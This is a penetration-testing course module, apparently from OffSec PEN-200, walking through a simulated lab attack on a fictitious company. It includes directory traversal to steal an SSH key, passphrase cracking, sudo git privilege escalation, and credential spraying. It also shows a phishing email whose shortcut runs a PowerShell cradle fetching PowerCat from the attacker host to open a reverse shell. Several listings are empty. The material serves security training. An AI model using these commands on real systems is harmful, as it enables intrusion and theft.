In this Learning Module, we will cover the following Learning Units:

- Enumerating the Public Network
- Attacking a Public Machine
- Gaining Access to the Internal Network
- Enumerating the Internal Network
- Attacking an Internal Web Application
- Gaining Access to the Domain Controller

Now that we have introduced all the individual pieces of a penetration test, it's time to put them together in a walkthrough. In this Module, we will conduct a simulated penetration test inspired by real-world findings.

The purpose of this Module is to act as a bridge between the PEN200 Modules and the Challenge Labs. One way to think about this Module is as "Challenge Lab Zero". If you wish, you can start the machines and attempt to attack them on your own, and then come back and read the methodology and story described here. Either way, we recommend following this methodology and the mindset it produces for tackling the Challenge Labs 1-6. Note that to save time, in several cases we will skip steps that will not yield results for this simulation. However, we will call out these instances as they occur.

In this scenario, the company *BEYOND Finances* has tasked us with conducting a penetration test of their IT infrastructure. The client wants to determine if an attacker can breach the perimeter and get domain admin privileges in the internal *Active Directory* (AD) environment. In this assessment, the client's goals for us are to obtain domain administrator privileges and access the domain controller.

We should be aware that each client may have different end goals for a penetration test based on their threat level, data infrastructure, and business model. For example, if the client's main business is warehousing data, our goal could be to obtain that data. That is because a breach of this nature would cause the most significant business impact to the client. In most environments, domain administrator access would help us accomplish that goal, but that is not always the case.

## 27.1. Enumerating the Public Network

This Learning Unit covers the following Learning Objectives:

- Enumerate machines on a public network
- Obtain useful information to use for later attacks

In this Learning Unit, we'll start with the first step of our penetration test, *enumeration*. Our fictitious client has provided us with two initial targets, which we can access via the PEN200 VPN. The following figure shows a network overview based on the client's information.

![[OffSec/OSCP/z. images/c9c0694bb2ed8183e1594b2bd57c6baf_MD5.jpg]]

Figure 1: Network Overview of provided Targets

Figure 1 shows the two accessible machines, WEBSRV1 and MAILSRV1, as well as their corresponding IP addresses.

The third octet you observe in your own lab instance may differ when starting the VM group later.

In the first section, we'll begin by setting up a basic work environment for our penetration test and then enumerate MAILSRV1.

## 27.1.1. MAILSRV1

Before we begin to interact with our target to enumerate it, let's set up a work environment for this penetration test. This will help us to store obtained files and information in a structured way throughout the assessment. In later phases of a penetration test, this will prove especially helpful as we'll collect a huge amount of data and information.

Structuring and isolating data and settings for multiple penetration tests can be quite the challenge. By reusing a Kali VM, we could accidentally expose previous-client data to new networks. Therefore, it is recommended to use a fresh Kali image for every assessment.

For this reason, let's create a **/home/kali/beyond** directory on our Kali VM. In it, we'll create two directories named after the two target machines we have access to now. In addition, we'll create a **creds.txt** text file to keep track of identified valid credentials and users.

```
kali@kali:~$ mkdir beyond

kali@kali:~$ cd beyond

kali@kali:~/beyond$ mkdir mailsrv1

kali@kali:~/beyond$ mkdir websrv1

kali@kali:~/beyond$ touch creds.txt
```

> Listing 1 - Basic work environment for this penetration test

Now that we set up a work environment, we are ready to enumerate the first target machine, MAILSRV1.

Documenting our findings is a crucial process for every penetration test. For this Module, we'll store results in the basic work environment we just set up. However, Markdown editors, such as [*Obsidian*](https://obsidian.md/), have become [quite popular](https://www.trustedsec.com/blog/obsidian-taming-a-collective-consciousness/) for documenting findings and data in real assessments as they are application-independent and contain functions that will simplify report writing and collaboration.

Let's begin with a port scan of MAILSRV1 using *Nmap*. A port scan is often the first active information gathering method we'll perform to get an overview of open ports and accessible services.

In a real penetration test, we would also use passive information gathering techniques such as *Google Dorks* and leaked password databases to obtain additional information. This would potentially provide us with usernames, passwords, and sensitive information.

We'll use **\-sV** to enable service and version detection as well as **\-sC** to use Nmap's default scripts. In addition, we'll enter **\-oN** to create an output file containing the scan results.

```

> Listing 2 - Nmap scan of MAILSRV1

Listing 2 shows that Nmap discovered eight open ports. Based on this information, we can establish that the target machine is a Windows system running an *IIS web server* and a [*hMailServer*](https://www.hmailserver.com/). This is not surprising as the machine is named MAILSRV1 in the topology provided by the client.

In a real-world penetration test, the hostnames may not always be as descriptive as they are in this Module.

As we may not be familiar with [hMailServer](https://www.hmailserver.com/), we can research this application by browsing the application's web page. It states that hMailServer is a free, open-source e-mail server for Microsoft Windows.

To identify potential vulnerabilities in hMailServer, we can use a search engine to find [CVEs and public exploits](https://www.cvedetails.com/vulnerability-list/vendor_id-8442/Hmailserver.html). However, as Nmap didn't discover a version number, we have to conduct a broader search. Unfortunately, the search didn't provide any meaningful results apart from some older CVEs.

![[OffSec/OSCP/z. images/867847b22095c3c6d6e42c667ef4be26_MD5.jpg]]

Figure 2: Vulnerabilities of hMailServer

Even if we had found a vulnerability with a matching exploit providing the code execution, we should not skip the remaining enumeration steps. While we may get access to the target system, we could potentially miss out on vital data or information for other services and systems.

Next, let's enumerate the IIS web server. First, we'll browse the web page.

![[OffSec/OSCP/z. images/c1410ea47ad5f35c2824f4b3cace2024_MD5.jpg]]

Figure 3: IIS Welcome Page on MAILSRV1

Figure 3 shows that IIS only displays the default welcome page. Let's try to identify directories and files by using **gobuster**. We'll enter **dir** to use directory enumeration mode, **\-u** for the URL, **\-w** for a wordlist, and **\-x** for file types we want to identify. For this example, we'll enter **txt**, **pdf**, and **config** to identify potential documents or configuration files. In addition, we'll use **\-o** to create an output file.

```

> Listing 3 - Using gobuster to identify pages and files on MAILSRV1

Listing 3 shows that gobuster did not identify any pages, files, or directories.

Not every enumeration technique needs to provide actionable results. In the initial information gathering phase, it is important to perform a variety of enumeration methods to get a complete picture of a system.

Let's summarize what information we obtained while enumerating MAILSRV1 so far. First, we launched a port scan with Nmap, which identified a running IIS web server and hMailServer. In addition, we established that the target is running Windows, then enumerated the running web server more closely. Unfortunately, this didn't provide any actionable information for us.

We cannot use the mail server at this moment. If we identify valid credentials and targets later in the penetration test, we could perhaps use the mail server to send a phishing email, for example.

This cyclical nature of a penetration test is an important concept for us to grasp because it provides a mindset of continuously reevaluating and including new information to follow previously inapproachable or newly identified attack vectors.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Assembling the Pieces - VM Group

#### Labs

Start the VM group to follow along the guided penetration test throughout the Module. Once you have access to the domain controller, retrieve the NTLM hash of the domain administrator account *BEYOND\\Administrator* and enter it as answer to this exercise.

Please make sure you are dumping the NTLM hash of the domain administrator user with RID 500 by utilizing dcsync attack via mimikatz, not by extracting creds from SAM file. The hashes will be different.

Answer

## 27.1.2. WEBSRV1

In this section, we'll enumerate the second target machine from the client's topology, WEBSRV1. Based on the name, we can assume that we'll discover a web server of some kind.

In a real penetration test, we could scan MAILSRV1 and WEBSRV1 in a parallel fashion. Meaning, that we could perform the scans at the same time to save valuable time for the client. If we do so, it's vital to perform the scans in a structured way to not mix up results or miss findings.

As before, we'll begin with an **nmap** scan of the target machine.

```
kali@kali:~/beyond$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244

```

> Listing 4 - Nmap scan of WEBSRV1

The Nmap scan revealed only two open ports: 22 and 80. Nmap fingerprinted the services as running an *SSH* service and *HTTP* service on the ports, respectively.

From the SSH banner, we retrieve the information that the target is running on an *Ubuntu* Linux system. However, the banner provides much more detail with a bit of manual work. Let's copy and then paste the "OpenSSH 8.9p1 Ubuntu 3" string into a search engine. The results contain a link to the Ubuntu Launchpad web page, which contains a list of OpenSSH version information mapped to specific [Ubuntu releases](https://launchpad.net/ubuntu/+source/openssh). In our example, the version is mapped to *Jammy Jellyfish*, which is the version name for Ubuntu 22.04.

![[OffSec/OSCP/z. images/30c3af7dd5dd041e5fcabf95235c4173_MD5.jpg]]

Figure 4: OpenSSH versions in Jammy Jellyfish

For port 22, we currently only have the option to perform a password attack. Because we don't have any username or password information, we should analyze other services first. Therefore, let's enumerate port 80 running *Apache 2.4.52*.

We should also search for potential vulnerabilities in Apache 2.4.52 as we did for hMailServer. As this will yield no actionable results, we'll skip it.

We'll begin by browsing to the web page. Because the Nmap scan provided the HTTP title *BEYOND Finances*, our chances of encountering a non-default page again are high.

![[OffSec/OSCP/z. images/4c6889b21a34eae7e45299601412e00f_MD5.jpg]]

Figure 5: Landing Page of WEBSRV1

Figure 5 shows us a basic company web page. However, if we review the web site, we'll notice it doesn't contain a menu bar or links to other pages. At first glance, there seems to be nothing actionable for us.

Let's inspect the web page's source code to determine the technology being used by right-clicking in our browser on Kali and selecting *View Page Source*. For most frameworks and web solutions, such as [*CMS's*](https://en.wikipedia.org/wiki/Content_management_system), we can find artifacts and string indicators in the source code.

Let's browse through the source code to examine the page's header, comments, and links. At the bottom, we'll find some links as shown in the following figure.

![[OffSec/OSCP/z. images/48dca16733c7abc51abe772d885c9a7c_MD5.jpg]]

Figure 6: Landing Page of WEBSRV1

We notice that the links contain the strings "wp-content" and "wp-includes". By entering these keywords in a search engine, we can establish that the page uses WordPress.

To confirm this and potentially provide more information about the technology stack in use, we can use [**whatweb**](https://www.kali.org/tools/whatweb/).

```
kali@kali:~/beyond$ whatweb http://192.168.50.244

```

> Listing 5 - WhatWeb scan of WEBSRV1

The output confirms that the web page uses *WordPress 6.0.2*.

While the WordPress core itself has had its share of vulnerabilities, the WordPress developers are quick to patch them. A review of the release history for WordPress indicates this version was released in August 2022 and at the time of writing this Module, it's the most [current version](https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/).

However, WordPress themes and plugins are written by the community and many vulnerabilities are improperly patched or are simply never fixed at all. This makes plugins and themes a great target for compromise.

Let's perform a scan on these components with *WPScan*, a WordPress vulnerability scanner. This tool attempts to determine the WordPress versions, themes, and plugins as well as their vulnerabilities.

WPScan looks up component vulnerabilities in the [*WordPress Vulnerability Database*](https://wpscan.com/statistics), which requires an API token. A limited API key can be obtained for free by registering an account on the WPScan homepage. However, even without providing an API key, WPScan is a great tool to enumerate WordPress instances.

To perform the scan without an API key, we'll provide the URL of the target for **\--url**, set the plugin detection to aggressive, and specify to enumerate all popular plugins by entering **p** as an argument to **\--enumerate**. In addition, we'll use **\-o** to create an output file.

```
kali@kali:~/beyond$ wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan

> Listing 6 - WPScan of the WordPress web page on WEBSRV1

Listing 6 shows that WPScan discovered six active plugins in the target WordPress instance:

- [*akismet*](https://wordpress.org/plugins/akismet/)
- [*classic-editor*](https://wordpress.org/plugins/classic-editor/)
- [*contact-form-7*](https://wordpress.org/plugins/contact-form-7/)
- [*duplicator*](https://wordpress.org/plugins/duplicator/)
- [*elementor*](https://wordpress.org/plugins/elementor/)
- [*wordpress-seo*](https://wordpress.org/plugins/wordpress-seo/)

The output also states that the Duplicator plugin version is outdated.

Instead of using WPScan's vulnerability database, let's use *searchsploit* to find possible exploits for vulnerabilities in the installed plugins. For most of the identified plugins, WPScan provided us with the detected versions. Because most of the plugins are up to date and no version could be detected for akismet, let's start with Duplicator.

> Listing 7 - SearchSploit results for the Duplicator WordPress plugin

The output shows that there are two exploits matching the version of the Duplicator plugin on WEBSRV1. One is tagged with *Metasploit*, indicating that this exploit was developed for The Metasploit Framework. We'll review them in the next Learning Unit.

Let's summarize what information we obtained about WEBSRV1 in this section. We learned that the target machine is an Ubuntu 22.04 system with two open ports: 22 and 80. A WordPress instance runs on port 80 with various active plugins. A plugin named Duplicator is outdated and a SearchSploit query provided us with two vulnerability entries matching the version.

## 27.2. Attacking a Public Machine

This Learning Unit covers the following Learning Objectives:

- Use vulnerabilities in WordPress Plugins
- Crack the passphrase of an SSH private key
- Elevate privileges using sudo commands
- Leverage developer artifacts to obtain sensitive information

In the previous Learning Unit, we gathered information on both MAILSRV1 and WEBSRV1 machines. Based on the enumeration results, we identified a potentially vulnerable WordPress plugin on WEBSRV1.

In this Learning Unit, we'll attempt to exploit this vulnerable plugin and get access to the system. If we are successful, we'll perform privilege escalation and search the target machine for sensitive information.

## 27.2.1. Initial Foothold

In the previous Learning Unit, we used SearchSploit to find exploits for Duplicator 1.3.26. SearchSploit provided two exploits for this version, one of which was an exploit for Metasploit. Let's use SearchSploit to examine the other displayed exploit by providing the ExploitDB ID from Listing 7 to **\-x**.

```
kali@kali:~/beyond$ searchsploit -x 50420
```

> Listing 10 - SearchSploit command to copy the exploit script to the current directory

To use the script, we must provide the URL of our target and the file we want to retrieve. Let's attempt to read and display the contents of **/etc/passwd** both to confirm that the target is indeed vulnerable and to obtain user account names of the system.

```

```

> Listing 11 - Performing a Directory Traversal attack on WEBSRV1

Very nice! We successfully obtained the contents of **/etc/passwd** and identified two user accounts, *daniela* and *marcus*. Let's add them to **creds.txt**.

As we have learned in the *Common Web Application Attacks* Module, there are several files we can attempt to retrieve via Directory Traversal to obtain access to a system. One of the most common methods is to retrieve an SSH private key configured with permissions that are too open.

In this example, we'll attempt to retrieve an SSH private key with the name **id\_rsa**. The name will differ depending on the specified type when creating an SSH private key with [*ssh-keygen*](https://linux.die.net/man/1/ssh-keygen). For example, when choosing *ecdsa* as the type, the resulting SSH private key is named **id\_ecdsa** by default.

Let's check for SSH private keys with the name **id\_rsa** in the home directories of *daniela* and *marcus*.

```

> Listing 12 - Retrieving the SSH private key of daniela

Listing 12 shows that we have successfully retrieved the SSH private key of *daniela*. Let's save the key in a file named **id\_rsa** in the current directory.

Next, let's attempt to leverage this key to access WEBSRV1 as *daniela* via SSH. To do so, we have to modify the file permissions as we have done several times in this course.

```
kali@kali:~/beyond/websrv1$ chmod 600 id_rsa

kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa':
```

> Listing 13 - Trying to leverage the SSH private key to access WEBSRV1

Listing 13 shows that the SSH private key is protected by a passphrase. Therefore, let's attempt to crack it using **ssh2john** and **john** with the **rockyou.txt** wordlist. After a few moments, the cracking attempt is successful as shown in the following listing.

```
kali@kali:~/beyond/websrv1$ ssh2john id_rsa > ssh.hash

kali@kali:~/beyond/websrv1$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
...
tequieromucho    (id_rsa) 
...
```

> Listing 14 - Cracking the passphrase of the SSH private key

Now, let's attempt to access the system again via SSH by providing the passphrase.

```
kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa': 

Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-48-generic x86_64)
...
daniela@websrv1:~$
```

> Listing 15 - Accessing WEBSRV1 via SSH

Success! We gained access to the first target in the penetration test.

Before we head into the next section, where we'll perform post-exploitation enumeration, let's add the cracked passphrase to the **creds.txt** file in the work environment directory. As users tend to reuse passwords and passphrases, we may need it again later in this assessment.

## 27.2.2. A Link to the Past

In the previous section, we gained access to the target machine WEBSRV1. In this section, we'll perform local enumeration to identify attack vectors and sensitive information and attempt to elevate our privileges.

Because we often have time constraints in a penetration test, such as the duration of an assessment, let's use the *linPEAS* automated Linux enumeration script to obtain a broad variety of information and identify any potential low hanging fruit.

To do this, let's copy **linpeas.sh** to the **websrv1** directory and start a Python3 web server to serve it.

```
kali@kali:~/beyond/websrv1$ cp /usr/share/peass/linpeas/linpeas.sh .

kali@kali:~/beyond/websrv1$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

> Listing 16 - Serving the linpeas enumeration script

In our SSH session, we can use **wget** to download the enumeration script. In addition, we'll use **chmod** to make the script executable.

```
daniela@websrv1:~$ wget http://192.168.119.5/linpeas.sh

```

> Listing 17 - Downloading linpeas and making it executable

Now, we can run the script and start the enumeration.

```
daniela@websrv1:~$ ./linpeas.sh
```

> Listing 18 - Starting the local enumeration with linpeas

Once the enumeration script has finished, let's review some of the results.

We'll begin with the system information.

Listing 19 confirms that the machine is running Ubuntu 22.04 as we've identified via the OpenSSH service version.

Next, we'll review the network interfaces.

```

```

> Listing 20 - Network interfaces

Listing 20 shows only one network interface apart from the loopback interface. This means that the target machine is not connected to the internal network, and we cannot use it as a pivot point.

Since we have already enumerated MAILSRV1 without any actionable results and this machine is not connected to the internal network, we must discover sensitive information, such as credentials, to get a foothold in the internal network. To obtain files and data from other users and the system, we'll make elevating our privileges our priority.

The following result section from linPEAS contains an interesting piece of information regarding commands executable with sudo.

```

    (ALL) NOPASSWD: /usr/bin/git
```

> Listing 21 - Sudo commands for daniela

Listing 21 shows that *daniela* can run **/usr/bin/git** with sudo privileges without entering a password.

Before we try to leverage this finding into privilege escalation, let's finish reviewing the linPEAS results. Otherwise, we may miss some crucial findings.

The next interesting section is *Analyzing Wordpress Files*, which contains a clear-text password used for database access.

```
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27 11:31 /srv/www/wordpress/wp-config.php                                                                                                                          
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
```

> Listing 22 - WordPress database connection settings

Discovering a clear-text password is always a potential high value finding. Let's save the password in the **creds.txt** file on our Kali machine for future use.

Another interesting aspect of this finding is the path displayed starts with **/srv/www/wordpress/**. The WordPress instance is not installed in **/var/www/html** where web applications are commonly found on Debian-based Linux systems. While this is not an actionable result, we should keep it in mind for future steps.

Let's continue reviewing the linPEAS results. In the *Analyzing Github Files* section, we'll find that the WordPress directory is a *Git repository*.

```
╔══════════╣ Analyzing Github Files (limit 70)
                                                                                                                                
drwxr----- 8 root root 4096 Sep 27 14:26 /srv/www/wordpress/.git
```

> Listing 23 - Git repository in the WordPress directory

Based on the output in listing 23, we can assume that Git is used as the version control system for the WordPress instance. Reviewing the commits of the Git repository may allow us to identify changes in configuration data and sensitive information such as passwords.

The directory is owned by *root* and is not readable by other users as shown in Listing 23. However, we can leverage sudo to use Git commands in a privileged context and therefore search the repository for sensitive information.

For now, let's skip the rest of the linPEAS output and summarize what information and potential privilege escalation vectors we've gathered so far.

WEBSRV1 runs Ubuntu 22.04 and is not connected to the internal network. The *sudoers* file contains an entry allowing *daniela* to run **/usr/bin/git** with elevated privileges without providing a password. In addition, we learned that the WordPress directory is a Git repository. Finally, we obtained a clear-text password in the database connection settings for WordPress.

Based on this information we can define three potential privilege escalation vectors:

- Abuse sudo command **/usr/bin/git**
- Use sudo to search the Git repository
- Attempt to access other users with the WordPress database password

The most promising vector at the moment is to abuse the sudo command **/usr/bin/git** because we don't have to enter a password. Most commands that run with sudo can be abused to obtain an interactive shell with elevated privileges.

To find potential abuses when a binary such as *git* is allowed to run with sudo, we can consult [*GTFOBins*](https://gtfobins.github.io/). On this page, we enter **git** in the search bar and select it in the [list](https://gtfobins.github.io/gtfobins/git). Then, let's scroll down until we reach the *Sudo* section:

![[OffSec/OSCP/z. images/cc24e40f2efb6b1b5ea0dbbd98588a1b_MD5.jpg]]

Figure 7: Sudo abuse vector for git

Figure 7 shows two of the five potential abuse vectors to elevate privileges via git with sudo privileges. Let's try the first one by setting an environment variable that executes when launching the help menu.

```
daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
sudo: sorry, you are not allowed to set the following environment variables: PAGER
```

> Listing 24 - Abusing git sudo command by setting an environment variable

Unfortunately, the output states that we are not allowed to set an environment variable.

Next, let's try the second abuse vector. This command opens the help menu in the default [*pager*](https://en.wikipedia.org/wiki/Terminal_pager). On Linux, one of the most popular pagers is *less*. The commands to navigate the pager are similar to *vi* and can be used to execute code in the context of the user account that launched the pager.

```
daniela@websrv1:~$ sudo git -p help config
```

> Listing 25 - Abusing git sudo command by launching pager in a privileged context

To execute code through the pager, we can enter **!** followed by a command or path to an executable file. As Figure 7 shows, we can enter a path to a shell. Let's use **/bin/bash** to obtain an interactive shell.

```
...
       •   no section or name was provided (ret=2),

       •   the config file is invalid (ret=3),

!/bin/bash

root@websrv1:/home/daniela# whoami
root
```

> Listing 26 - Executing commands via the pager to obtain an interactive shell

Nice! We successfully elevated our privileges on WEBSRV1.

Armed with *root* privileges, we'll continue enumerating the system. Before doing so, let's search the Git repository for sensitive information first.

To do so, we'll change our current directory to the Git repository. Then, we can use **git status** to display the state of the Git working directory and **git log** to show the commit history. We can find these on [*Git's Reference page*](https://git-scm.com/docs).

```

> Listing 27 - Examining the Git repository

Listing 27 shows that there are two commits in the repository. One is labeled as *initial commit* and one as *Removed staging script and internal network access*. That's quite interesting as it indicates that the machine previously had access to the internal network. In addition, the first commit may contain a staging script that was removed.

We could switch back to a specific commit by using **git checkout** and a commit hash. However, this could break the functionality of the web application and potentially disrupt the client's day to day operations.

A better approach is to use **git show**, which shows differences between commits. In our case, we'll supply the commit hash of the latest commit to the command as we are interested in the changes after the first commit.

```

> Listing 28 - Displaying the differences between the two commits

Nice! By displaying the differences between commits, we identified another set of credentials. The approach of automating tasks with [*sshpass*](https://linux.die.net/man/1/sshpass) is commonly used to provide a password in a non-interactive way for scripts.

Before we conclude this section, let's add the username and password to **creds.txt** on our Kali machine.

In a real assessment, we should run linPEAS again, once we have obtained privileged access to the system. Because the tool can now access files of other users and the system, it may discover sensitive information and data that wasn't accessible when running as *daniela*.

Let's summarize what we've achieved in this section. We used the linPEAS automated enumeration script to identify potentially sensitive information and privilege escalation vectors. The script identified that **/usr/bin/git** can be run with sudo as user *daniela*, the WordPress directory is a Git repository, and a cleartext password is used in the WordPress database settings. By abusing the sudo command, we successfully elevated our privileges. Then, we identified a previously removed bash script in the Git repository and displayed it. This script contained a new username and password.

In the next Learning Unit, we'll structure and leverage the information we've obtained in an attack, which will provide access to the internal network.

## 27.3. Gaining Access to the Internal Network

This Learning Unit covers the following Learning Objectives:

- Validate domain credentials from a non-domain-joined machine
- Perform phishing to get access to the internal network

In the previous Learning Unit, we obtained privileged access to WEBSRV1. In addition, we identified several passwords and usernames.

In this Learning Unit, we'll leverage this information. First, we'll attempt to confirm a valid set of credentials and then we'll use them to get access to the internal network by preparing and sending a phishing e-mail.

## 27.3.1. Domain Credentials

In this section, we'll attempt to identify valid combinations of usernames and passwords on MAILSRV1. Let's begin by using the current information in our **creds.txt** file to create a list of usernames and passwords. Let's begin by reviewing the current information in **creds.txt**.

```
kali@kali:~/beyond$ cat creds.txt                  
daniela:tequieromucho (SSH private key passphrase)
wordpress:DanielKeyboard3311 (WordPress database connection settings)
john:dqsTwTpZPn#nL (fetch_current.sh)

Other identified users:
marcus
```

> Listing 29 - Displaying contents of creds.txt

Based on the output in Listing 29, we'll create a list of usernames containing *marcus*, *john*, and *daniela*. Because *wordpress* is not a real user but is used for the database connection of the WordPress instance on WEBSRV1, we'll omit it. In addition, we'll create a password list containing *tequieromucho*, *DanielKeyboard3311*, and *dqsTwTpZPn#nL*. Both lists and their contents are shown in the following listing:

```
kali@kali:~/beyond$ cat usernames.txt                                         
marcus
john
daniela

kali@kali:~/beyond$ cat passwords.txt
tequieromucho
DanielKeyboard3311
dqsTwTpZPn#nL
```

> Listing 30 - Displaying the created lists containing the identified usernames and passwords

Now we have two lists containing the usernames and passwords we have identified so far.

Our next step is to use **crackmapexec** and check these credentials against SMB on MAILSRV1. We'll specify **\--continue-on-success** to avoid stopping at the first valid credentials.

```
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success

```

> Listing 31 - Checking for valid credentials with CrackMapExec

Listing 31 shows that CrackMapExec identified one valid set of credentials. This isn't much of a surprise since we retrieved the username and password from the staging script on WEBSRV1. However, *john* could have changed their password in the meantime.

The output shows another great CrackMapExec feature: it identified the domain name and added it to the usernames. This means that MAILSRV1 is a domain-joined machine, and we have identified a valid set of domain credentials.

Now that we have valid domain credentials, we need to come up with a plan for our next steps. Reviewing the CrackMapExec output and the port scan for MAILSRV1, we don't have many options. We have identified the mail server and SMB, but no services such as WinRM or RDP. In addition, the scan showed that *john* is not a local administrator on MAILSRV1 as indicated by the missing *Pwn3d!*.

This provides us with two options. We can further enumerate SMB on MAILSRV1 and check for sensitive information on accessible shares or we can prepare a malicious attachment and send a phishing email as *john* to *daniela* and *marcus*.

We should be aware that CrackMapExec outputs *STATUS\_LOGON\_FAILURE* when a password for an existing user is not correct, but also when a user does not exist at all. Therefore, we cannot be sure at this point that the domain user accounts *daniela* and *marcus* even exist.

Let's choose option one first and leverage CrackMapExec to list the SMB shares and their permissions on MAILSRV1 by providing **\--shares** and *john*'s credentials. We may identify accessible shares containing additional information that we can use for the second option.

```
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares

```

> Listing 32 - Listing SMB shares on MAILSRV1 with CrackMapExec

Listing 32 shows that CrackMapExec only identified the default shares on which we have no actionable permissions.

At this point, we only have the second option left, preparing an email with a malicious attachment, and sending it to *daniela* and *marcus*.

Let's summarize what we did in this section. First, we used the information we retrieved in the previous Learning Unit and leveraged it in a password attack against MAILSRV1. This password attack resulted in discovering one valid set of credentials. Then, we enumerated the SMB shares on MAILSRV1 as *john* without any actionable results.

## 27.3.2. Phishing for Access

In this section, we'll perform a client-side attack by sending a phishing e-mail. Throughout this course, we've mainly discussed two client-side attack techniques: Microsoft Office documents containing Macros and Windows Library files in combination with shortcut files.

Because we don't have any information about the internal machines or infrastructure, we'll choose the second technique as Microsoft Office may not be installed on any of the target systems.

For this attack, we have to set up a WebDAV server, a Python3 web server, a Netcat listener, and prepare the Windows Library and shortcut files.

Let's begin by setting up the WebDAV share on our Kali machine on port 80 with *wsgidav*. In addition, we'll create the **/home/kali/beyond/webdav** directory as the WebDAV root directory.

```
kali@kali:~$ mkdir /home/kali/beyond/webdav

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/

```

> Listing 33 - Starting WsgiDAV on port 80

Listing 33 shows that our WebDAV share is now served on port 80 with anonymous access settings.

Now, let's connect to WINPREP via RDP as *offsec* with a password of *lab* in order to prepare the Windows Library and shortcut files. Once connected, we'll open [*Visual Studio Code*](https://code.visualstudio.com/) and create a new text file on the desktop named **config.Library-ms**.

![[OffSec/OSCP/z. images/94c2b319d6eaeea2f60dd17d13c59a1f_MD5.jpg]]

Figure 8: Empty Library file in Visual Studio Code

Now, let's copy the Windows Library code we previously used in the *Client-Side Attacks* Module, paste it into Visual Studio Code, and check that the IP address points to our Kali machine.

```

```

> Listing 34 - Windows Library code for connecting to our WebDAV Share

Let's save the file and transfer it to **/home/kali/beyond** on our Kali machine.

Next, we'll create the shortcut file on WINPREP. For this, we'll right-click on the Desktop and select *New* > *Shortcut*. A victim double-clicking the shortcut file will download PowerCat and create a reverse shell. We can enter the following command to achieve this:

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```

> Listing 35 - PowerShell Download Cradle and PowerCat Reverse Shell Execution for shortcut file

Once we enter the command and **install** as shortcut file name, we can transfer the resulting shortcut file to our Kali machine into the WebDAV directory.

Our next step is to serve PowerCat via a Python3 web server. Let's copy **powercat.ps1** to **/home/kali/beyond** and serve it on port 8000 as we have specified in the shortcut's PowerShell command.

```
kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

kali@kali:~/beyond$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

> Listing 36 - Serving powercat.ps1 on port 8000 via Python3 web server

Once the Python3 web server is running, we can start a Netcat listener on port 4444 in a new terminal tab to catch the incoming reverse shell from PowerCat.

```
kali@kali:~/beyond$ nc -nvlp 4444      
listening on [any] 4444 ...
```

> Listing 37 - Listening on port 4444 with Netcat

With Netcat running, all services and files are prepared. Now, let's create the email.

We could also use the WebDAV share to serve Powercat instead of the Python3 web server. However, serving the file via another port provides us additional flexibility.

To send the email, we'll use the command-line SMTP test tool [*swaks*](http://www.jetmore.org/john/code/swaks/). As a first step, let's create the body of the email containing our pretext. Because we don't have specific information about any of the users, we have to use something more generic. Fortunately, we obtained some information about the target company on WEBSRV1 within the Git repository.

Including information only known to employees or staff will tremendously increase our chances that an attachment is opened.

We'll create the **body.txt** file in **/home/kali/beyond** with the following text:

```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

Hopefully this text will convince *marcus* or *daniela* to open our attachment.

In a real assessment we should also use passive information gathering techniques to obtain more information about a potential target. Based on this information, we could create more tailored emails and improve our chances of success tremendously.

Now we are ready to build the swaks command to send the emails. We'll provide **daniela@beyond.com** and **marcus@beyond.com** as recipients of the email to **\-t**, **john@beyond.com** as name on the email envelope (sender) to **\--from**, and the Windows Library file to **\--attach**. Next, we'll enter **\--suppress-data** to summarize information regarding the SMTP transactions. For the email subject and body, we'll provide **Subject: Staging Script** to **\--header** and **body.txt** to **\--body**. In addition, we'll enter the IP address of MAILSRV1 for **\--server**. Finally, we'll add **\-ap** to enable password authentication.

The complete command is shown in the following listing. Once entered, we have to provide the credentials of *john*:

```
kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

> Listing 38 - Sending emails with the Windows Library file as attachment to marcus and daniela

After waiting a few moments, we receive requests for our WebDAV and Python3 web servers. Let's check the Netcat listener.

> Listing 40 - Obtaining basic information about the target machine

Listing 40 shows that we landed on the CLIENTWK1 system as domain user *marcus*. In addition, the IP address of the system is *172.16.6.243/24*, indicating an internal IP range. We should also document the IP address and network information, such as the subnet and gateway in our workspace directory.

Let's briefly summarize what we did in this section. First, we set up our Kali machine to provide the necessary services and files for our attack. Then, we prepared a Windows Library and shortcut file on WINPREP. Once we sent our email with the attachment, we received an incoming reverse shell from CLIENTWK1 in the internal network.

## 27.4. Enumerating the Internal Network

This Learning Unit covers the following Learning Objectives:

- Gain situational awareness in a network
- Enumerate hosts, services, and sessions in a target network
- Identify attack vectors in a target network

